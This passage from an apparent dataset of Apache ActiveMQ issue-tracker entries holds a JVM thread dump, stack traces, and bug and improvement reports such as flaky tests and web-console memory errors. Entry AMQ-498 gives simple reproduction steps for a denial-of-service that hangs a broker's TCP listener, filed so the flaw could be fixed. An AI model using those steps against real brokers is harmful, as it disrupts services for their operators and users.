java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"RMI Scheduler(0)" daemon prio=10 tid=0x00007f09e0010800 nid=0x1c09 waiting on condition &#91;0x00007f0a10f8a000&#93;   java.lang.Thread.State: TIMED_WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x00000000c5747e48> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:226) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2082) at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1090) at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:807) at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1068) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"RMI TCP Connection(2)-10.179.133.105" daemon prio=10 tid=0x00007f09d4001000 nid=0x1c08 runnable &#91;0x00007f0a1108b000&#93;   java.lang.Thread.State: RUNNABLE at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:152) at java.net.SocketInputStream.read(SocketInputStream.java:122) at java.io.BufferedInputStream.fill(BufferedInputStream.java:235) at java.io.BufferedInputStream.read(BufferedInputStream.java:254) locked <0x00000000c5861c08> (a java.io.BufferedInputStream) at java.io.FilterInputStream.read(FilterInputStream.java:83) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:538) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:811) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:670) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"RMI RenewClean-&#91;10.179.133.105:40132&#93;" daemon prio=10 tid=0x00007f09d8003800 nid=0x1c07 in Object.wait() &#91;0x00007f0a1118c000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor) at java.lang.Object.wait(Native Method) waiting on <0x00000000c5748368> (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:135) locked <0x00000000c5748368> (a java.lang.ref.ReferenceQueue$Lock) at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(DGCClient.java:535) at java.lang.Thread.run(Thread.java:744)"RMI TCP Connection(1)-127.0.0.1" daemon prio=10 tid=0x00007f09dc001000 nid=0x1c06 runnable &#91;0x00007f0a1128d000&#93;   java.lang.Thread.State: RUNNABLE at java.net.SocketInputStream.socketRead0(Native Method) at java.net.SocketInputStream.read(SocketInputStream.java:152) at java.net.SocketInputStream.read(SocketInputStream.java:122) at java.io.BufferedInputStream.fill(BufferedInputStream.java:235) at java.io.BufferedInputStream.read(BufferedInputStream.java:254) locked <0x00000000c58620e8> (a java.io.BufferedInputStream) at java.io.FilterInputStream.read(FilterInputStream.java:83) at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:538) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:811) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:670) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:744)"GC Daemon" daemon prio=10 tid=0x00007f09e0004800 nid=0x1c05 in Object.wait() &#91;0x00007f0a11399000&#93;   java.lang.Thread.State: TIMED_WAITING (on object monitor) at java.lang.Object.wait(Native Method) waiting on <0x00000000c597dc30> (a sun.misc.GC$LatencyLock) at sun.misc.GC$Daemon.run(GC.java:117) locked <0x00000000c597dc30> (a sun.misc.GC$LatencyLock)"RMI TCP Accept-0" daemon prio=10 tid=0x00007f09e0001000 nid=0x1c03 runnable &#91;0x00007f0a1159b000&#93;   java.lang.Thread.State: RUNNABLE at java.net.PlainSocketImpl.socketAccept(Native Method) at java.net.AbstractPlainSocketImpl.accept(AbstractPlainSocketImpl.java:398) at java.net.ServerSocket.implAccept(ServerSocket.java:530) at java.net.ServerSocket.accept(ServerSocket.java:498) at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop(TCPTransport.java:388) at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run(TCPTransport.java:360) at java.lang.Thread.run(Thread.java:744)"Service Thread" daemon prio=10 tid=0x00007f0a1c117000 nid=0x1bff runnable &#91;0x0000000000000000&#93;   java.lang.Thread.State: RUNNABLE"C2 CompilerThread1" daemon prio=10 tid=0x00007f0a1c115000 nid=0x1bfe waiting on condition &#91;0x0000000000000000&#93;   java.lang.Thread.State: RUNNABLE"C2 CompilerThread0" daemon prio=10 tid=0x00007f0a1c112000 nid=0x1bfd waiting on condition &#91;0x0000000000000000&#93;   java.lang.Thread.State: RUNNABLE"Signal Dispatcher" daemon prio=10 tid=0x00007f0a1c107800 nid=0x1bfc runnable &#91;0x0000000000000000&#93;   java.lang.Thread.State: RUNNABLE"Finalizer" daemon prio=10 tid=0x00007f0a1c0f1000 nid=0x1bfb in Object.wait() &#91;0x00007f0a18efd000&#93;   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) waiting on <0x00000000f0e506b8> (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:135) locked <0x00000000f0e506b8> (a java.lang.ref.ReferenceQueue$Lock) at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:151) at java.lang.ref.Finalizer$FinalizerThread.run(Finalizer.java:189)"Reference Handler" daemon prio=10 tid=0x00007f0a1c0ed000 nid=0x1bfa in Object.wait() &#91;0x00007f0a18ffe000&#93;   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) waiting on <0x00000000c5862828> (a java.lang.ref.Reference$Lock) at java.lang.Object.wait(Object.java:503) at java.lang.ref.Reference$ReferenceHandler.run(Reference.java:133) locked <0x00000000c5862828> (a java.lang.ref.Reference$Lock)"main" prio=10 tid=0x00007f0a1c008800 nid=0x1bf6 in Object.wait() &#91;0x00007f0a23c3e000&#93;   java.lang.Thread.State: WAITING (on object monitor) at java.lang.Object.wait(Native Method) waiting on <0x00000000eebacb28> (a java.lang.Thread) at java.lang.Thread.join(Thread.java:1280) locked <0x00000000eebacb28> (a java.lang.Thread) at java.lang.Thread.join(Thread.java:1354) at org.apache.activemq.transport.TransportServerThreadSupport.doStop(TransportServerThreadSupport.java:81) at org.apache.activemq.transport.tcp.TcpTransportServer.doStop(TcpTransportServer.java:399) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:279) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:2030) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:727) at org.apache.activemq.transport.amqp.joram.ActiveMQAdmin.stopServer(ActiveMQAdmin.java:125) at org.objectweb.jtests.jms.framework.JMSTestCase.tearDown(JMSTestCase.java:112) at org.objectweb.jtests.jms.framework.PTPTestCase.tearDown(PTPTestCase.java:171) at junit.framework.TestCase.runBare(TestCase.java:146) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.junit.runners.Suite.runChild(Suite.java:127) at org.junit.runners.Suite.runChild(Suite.java:26) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:238) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:63) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:236) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:53) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:229) at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:26) at org.junit.runners.ParentRunner.run(ParentRunner.java:309) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:107) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)"VM Thread" prio=10 tid=0x00007f0a1c0ea800 nid=0x1bf9 runnable "GC task thread#0 (ParallelGC)" prio=10 tid=0x00007f0a1c01e000 nid=0x1bf7 runnable "GC task thread#1 (ParallelGC)" prio=10 tid=0x00007f0a1c020000 nid=0x1bf8 runnable "VM Periodic Task Thread" prio=10 tid=0x00007f0a1c122000 nid=0x1c00 waiting on condition JNI global references: 176
issueID:AMQ-4979
type:Improvement
changed files:
texts:Put back Jolokia management API
Now that hawtio is pulled out, we need to put back standalone Jolokia API as it was in 5.8.0
issueID:AMQ-498
type:Improvement
changed files:
texts:Secure the server from simple DoS attacks
Originating from http://forums.logicblaze.com/posts/list/205.pageSimply start the 4.0 server (I used the stock config) in another window telnet to localhost 61616 you will receieve: ActiveMQ^[[?1;2c type asdfasdf The connection will close by itself. All future TCP connections, either from telnet or from real JMS clients, will hang.
issueID:AMQ-4980
type:Bug
changed files:
texts:MessageGroupLateArrivalsTest.testConsumerLateToBigPartyGetsNewGroup fails intermittently
The MessageGroupLateArrivalsTest.testConsumerLateToBigPartyGetsNewGroup test fails intermittently on CI boxes with the following error.Error Messageworker1 received 2 messages from groups &#91;C&#93; expected:<4> but was:<2>Stacktracejunit.framework.AssertionFailedError: worker1 received 2 messages from groups &#91;C&#93; expected:<4> but was:<2> at junit.framework.Assert.fail(Assert.java:57) at junit.framework.Assert.failNotEquals(Assert.java:329) at junit.framework.Assert.assertEquals(Assert.java:78) at junit.framework.Assert.assertEquals(Assert.java:234) at junit.framework.TestCase.assertEquals(TestCase.java:401) at org.apache.activemq.usecases.MessageGroupLateArrivalsTest.testConsumerLateToBigPartyGetsNewGroup(MessageGroupLateArrivalsTest.java:211) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
issueID:AMQ-4988
type:Bug
changed files:
texts:Possible case of curroption in Scheduler store
A potential point of store corruption exists where the journal files can be removed for some jobs before the index is updated.  If the broker failed before the index update occurs the store could restart with index entries that map to journal files that no longer exist.
issueID:AMQ-4989
type:Improvement
changed files:TcpTransportServer.java
texts:Better protect worker thread in TcpTransportServer that handles socket accepts
The worker thread in the TcpTransportServer that handles socket accepts from a queue can die if the handle method allows a throwable to escape.  We should catch these and log them as warn if the transport isn"t stopping as this is unexpected and we don"t want this thread to die and stop servicing incoming connections.
issueID:AMQ-4991
type:Bug
changed files:
texts:JmsSendReceiveTwoConnectionsWithSenderUsingPoolTest.testSendReceive fails with NPE in PooledProducer
This test fails with the following error.  I will add an @IGnore for now.java.lang.NullPointerException at org.apache.activemq.jms.pool.PooledProducer.send(PooledProducer.java:89) at org.apache.activemq.jms.pool.PooledProducer.send(PooledProducer.java:61) at org.apache.activemq.test.JmsSendReceiveTestSupport.sendMessage(JmsSendReceiveTestSupport.java:131) at org.apache.activemq.test.JmsSendReceiveTestSupport.sendMessages(JmsSendReceiveTestSupport.java:126) at org.apache.activemq.test.JmsSendReceiveTestSupport.testSendReceive(JmsSendReceiveTestSupport.java:113) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at junit.framework.TestCase.runTest(TestCase.java:176) at junit.framework.TestCase.runBare(TestCase.java:141) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:107) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:113) at junit.framework.TestResult$1.protect(TestResult.java:122) at junit.framework.TestResult.runProtected(TestResult.java:142) at junit.framework.TestResult.run(TestResult.java:125) at junit.framework.TestCase.run(TestCase.java:129) at junit.framework.TestSuite.runTest(TestSuite.java:255) at junit.framework.TestSuite.run(TestSuite.java:250) at org.junit.internal.runners.JUnit38ClassRunner.run(JUnit38ClassRunner.java:84) at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:53) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:123) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:104) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.apache.maven.surefire.util.ReflectionUtils.invokeMethodWithArray(ReflectionUtils.java:164) at org.apache.maven.surefire.booter.ProviderFactory$ProviderProxy.invoke(ProviderFactory.java:110) at org.apache.maven.surefire.booter.SurefireStarter.invokeProvider(SurefireStarter.java:175) at org.apache.maven.surefire.booter.SurefireStarter.runSuitesInProcessWhenForked(SurefireStarter.java:81) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:68)
issueID:AMQ-4994
type:Bug
changed files:
texts:Web Console - java.lang.OutOfMemoryError: Java heap space - while browsing deep queues
When browsing a deep queue with large number of messages, broker throws java.lang.OutOfMemoryError: Java heap space at java.util.Arrays.copyOf(Arrays.java:2367) at java.io.CharArrayWriter.write(CharArrayWriter.java:105) at java.io.PrintWriter.write(PrintWriter.java:426) at com.opensymphony.module.sitemesh.filter.RoutablePrintWriter.write(RoutablePrintWriter.java:144) at org.apache.jasper.runtime.JspWriterImpl.flushBuffer(JspWriterImpl.java:181) at org.apache.jasper.runtime.JspWriterImpl.write(JspWriterImpl.java:412) at org.apache.taglibs.standard.tag.common.core.OutSupport.writeEscapedXml(OutSupport.java:239) at org.apache.taglibs.standard.tag.common.core.OutSupport.out(OutSupport.java:208) at org.apache.taglibs.standard.tag.common.core.OutSupport.doStartTag(OutSupport.java:128) at org.apache.jsp.browse_jsp._jspx_meth_c_out_6(org.apache.jsp.browse_jsp:323) at org.apache.jsp.browse_jsp.access$8(org.apache.jsp.browse_jsp:314) at org.apache.jsp.browse_jsp$browse_jspHelper.invoke0(org.apache.jsp.browse_jsp:426) at org.apache.jsp.browse_jsp$browse_jspHelper.invoke(org.apache.jsp.browse_jsp:450) at org.apache.jsp.tag.web.jms.forEachMessage_tag.doTag(org.apache.jsp.tag.web.jms.forEachMessage_tag:89) at org.apache.jsp.browse_jsp._jspx_meth_jms_forEachMessage_0(org.apache.jsp.browse_jsp:170) at org.apache.jsp.browse_jsp._jspService(org.apache.jsp.browse_jsp:100) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1320) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102) at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291) at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)when trying to browse that queue.To reproduce it:1. Start a broker with default configuration2. Send 200k messages withant producer -Dmax=200000 -Ddurable=true -Dsubject=TEST3. Try to browse the queuehttp://localhost:8161/admin/browse.jsp?JMSDestination=TESTThe proper solution to this problem is to implement proper pagination while browsing the messages, so users can browse through all messages showing 100 msgs (or so) at the time and not using all the available memory.
issueID:AMQ-4995
type:Bug
changed files:
texts:Runtime Configuration Plugin - reapply destination interceptor after reload
When we change destination interceptor we need to reapply it to all destination as otherwise the effects will have no change. An example is changing property like "forwardOnly" in the following configuration<destinationInterceptors>    <virtualDestinationInterceptor>       <virtualDestinations>           <compositeQueue forwardOnly="false" name="VirtualDestination.CompositeQueue">               <forwardTo>                   <queue physicalName="VirtualDestination.QueueConsumer"/>                   <topic physicalName="VirtualDestination.TopicConsumer"/>               </forwardTo>           </compositeQueue>       </virtualDestinations>    </virtualDestinationInterceptor></destinationInterceptors>
issueID:AMQ-4998
type:Bug
changed files:
texts:Old Web Admin console does not manage  - new parameter  messageTTL consumerTTL connections.jsp and connections Panel display error messages
2014-01-29 13:03:31,358 | WARN  | /admin/connections.jsp | org.eclipse.jetty.servlet.ServletHandler | qtp1721309039-46javax.el.PropertyNotFoundException: The class "com.sun.proxy.$Proxy7" does not have the property "networkTTL".        at javax.el.BeanELResolver.getBeanProperty(BeanELResolver.java:579)        at javax.el.BeanELResolver.getValue(BeanELResolver.java:281)        at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)        at com.sun.el.parser.AstValue.getValue(AstValue.java:138)        at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)        at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)        at org.apache.jsp.connections_jsp._jspx_meth_c_forEach_1(org.apache.jsp.connections_jsp:213)        at org.apache.jsp.connections_jsp._jspService(org.apache.jsp.connections_jsp:95)        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:389)        at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:486)        at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:380)        at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)        at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1320)        at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)        at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)        at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:45)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)        at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)        at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)        at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)        at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:443)        at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)        at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:521)        at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:227)This template seems to work :<table id="connections" class="sortable autostripe"><thead><tr>        <th>Name</th>        <th>Message TTL</th>        <th>Consumer TTL</th>        <th>Dynamic Only</th>        <th>Conduit Subscriptions</th>        <th>Bridge Temps</th>        <th>Decrease Priorities</th>        <th>Dispatch Async</th></tr></thead><tbody><c:forEach items="${requestContext.brokerQuery.networkConnectors}" var="nc"><tr>        <td>${nc.name}</td>        <td>${nc.messageTTL}</td>        <td>${nc.consumerTTL}</td>        <td>${nc.dynamicOnly}</td>        <td>${nc.conduitSubscriptions}</td>        <td>${nc.bridgeTempDestinations}</td>        <td>${nc.decreaseNetworkConsumerPriority}</td>        <td>${nc.dispatchAsync}</td></tr>
issueID:AMQ-4999
type:Improvement
changed files:
texts:Disable jar indexing
ActiveMQ"s pom.xml uses maven-jar-plugin with <index>true</index>, which creates META-INF/INDEX.LIST file in the JAR files. This is useless when done only for a single jar file and might in some cases even be harmful.I propose to disable the generation INDEX.LIST files.For a full discussion of the drawbacks, see the corresponding bug track at Tomcat"s Bugzilla: https://issues.apache.org/bugzilla/show_bug.cgi?id=49236
issueID:AMQ-500
type:Bug
changed files:
texts:Conflicts between execution script and o.a.a.broker.Main class
I have not started to look at unix based start script, but I am finding some interesting issues with the one for use under Windows (activemq.bat).This script is using the java jar option that points to the ACTIVEMQ_HOME/bin/run.jar file.  The manifest points to the o.a.a.broker.Main class.  Use of this execution option and review of the o.a.a.broker.Main class (where it sets up a classloader with classpath pointing to the conf, lib and lib/optional directories would lead one to believe that the o.a.a.broker.Main class would be loaded from run.jar.  This is not the case as the script also defines the java property of &ldquo;java.ext.dirs&rdquo; to append the activemq directories.  While it also sets the command line classpath option, this is useless as including all the activemq directories will already include &ldquo;all&rdquo; activemq classes at the base classloader. This also includes a copy of the o.a.a.broker.Main class that is include in the &ldquo;uber&rdquo; activemq-4.0.jar in the ACTIVEMQ_HOME directory.Also with the definition java.ext.dirs this will total obviate any setting of classpath information on the classloader  (auto or parameter specified) by the o.a.a.broker.Main class.Obviously something is not right here.  If  o.a.a.broker.Main class is suppose to be setting up the class loader, why is the script setting the java.ext.dir property and the classpath option on the command line?
issueID:AMQ-5001
type:Bug
changed files:
texts:AbortSlowAckConsumer0Test has multiple test failures
As part of AMQ-4286, I split up AbortSlowAckConsumerTest into 3 parts.  AbortSlowAckConsumer0Test contains 3 new test cases and 1 test case that was overridden from it"s base class, AbortSlowConsumerTest.I don"t think these tests ever actually ran though, perhaps because of a bug with CombinationTestSupport.  As a result, this line of code in createBroker was never executed:AbortSlowAckConsumerStrategy strategy = (AbortSlowAckConsumerStrategy) underTest;This cast doesn"t work, so I updated the corresponding code in AbortSlowAckConsumer0Test.  The test now gets the errors below.  I"m not sure if this is because of my conversion, or if they never would have worked.  I will add @Ignore for now for all failing tests cases.Running org.apache.activemq.broker.policy.AbortSlowAckConsumer0TestTests run: 8, Failures: 4, Errors: 0, Skipped: 0, Time elapsed: 24.831 sec <<< FAILURE! - in org.apache.activemq.broker.policy.AbortSlowAckConsumer0TesttestZeroPrefetchConsumerIsAborted(org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test)  Time elapsed: 1.785 sec  <<< FAILURE!java.lang.AssertionError: Slow consumer not aborted. at org.junit.Assert.fail(Assert.java:88) at org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test.testZeroPrefetchConsumerIsAborted(AbortSlowAckConsumer0Test.java:104)testIdleConsumerCanBeAborted(org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test)  Time elapsed: 0.099 sec  <<< FAILURE!java.lang.AssertionError: Slow consumer not aborted. at org.junit.Assert.fail(Assert.java:88) at org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test.testIdleConsumerCanBeAborted(AbortSlowAckConsumer0Test.java:152)testIdleConsumerCanBeAbortedNoMessages(org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test)  Time elapsed: 0.109 sec  <<< FAILURE!java.lang.AssertionError: Idle consumer not aborted. at org.junit.Assert.fail(Assert.java:88) at org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test.testIdleConsumerCanBeAbortedNoMessages(AbortSlowAckConsumer0Test.java:126)testSlowConsumerIsAbortedViaJmx(org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test)  Time elapsed: 8.073 sec  <<< FAILURE!java.lang.AssertionError: one slow consumers expected:<1> but was:<0> at org.junit.Assert.fail(Assert.java:88) at org.junit.Assert.failNotEquals(Assert.java:743) at org.junit.Assert.assertEquals(Assert.java:118) at org.junit.Assert.assertEquals(Assert.java:555) at org.apache.activemq.broker.policy.AbortSlowConsumer0Test.testSlowConsumerIsAbortedViaJmx(AbortSlowConsumer0Test.java:99) at org.apache.activemq.broker.policy.AbortSlowAckConsumer0Test.testSlowConsumerIsAbortedViaJmx(AbortSlowAckConsumer0Test.java:84)
issueID:AMQ-5002
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP: If a proton client only sets the ttl, and not the message timestamp, ActiveMQ does not handle the expiration correctly
None
issueID:AMQ-5003
type:Bug
changed files:ActiveMQSession.java
texts:On overlapping Failover a session can consume large amounts of memory trying to clear consumer state.
If a consumer onMessage call is blocked waiting for failover to complete and send an ack and the connection to the broker is dropping as attempts to reconnect are happening a session can queue up very large number of scheduler tasks to clear in progress messages for open consumers.  Since the consumer will be holding the lock these can"t fire so they just pile on.
issueID:AMQ-5004
type:Bug
changed files:
texts:Dispatching large messages over AMQP is very slow.
When testing against the QPid JMS client we see that a producer sending large messages 10mb+ is quite fast but a consumer takes exponentially longer to receive the message.
issueID:AMQ-5005
type:Improvement
changed files:
texts:Eclipse build with latest Scala plugins fails
Being an idiot, I installed the "latest" scala plugins for Eclipse before actually checking the ActiveMQ builds to see what it requires.  Those plugins currently are Scala 2.10 based.   The code doesn"t build with those plugins, but a relatively minor change fixes it (and doesn"t cause problems with the default 2.9 compiler).
issueID:AMQ-5006
type:Bug
changed files:
texts:Upgrade surefire to the latest version
Upgrade the maven-surefire-plugin to 2.16
issueID:AMQ-5007
type:Improvement
changed files:
texts:Upgrade Proton to v0.6
Upgrade to latest release of proton.
issueID:AMQ-5008
type:New Feature
changed files:
texts:Support for certificate revocation checking (with patch)
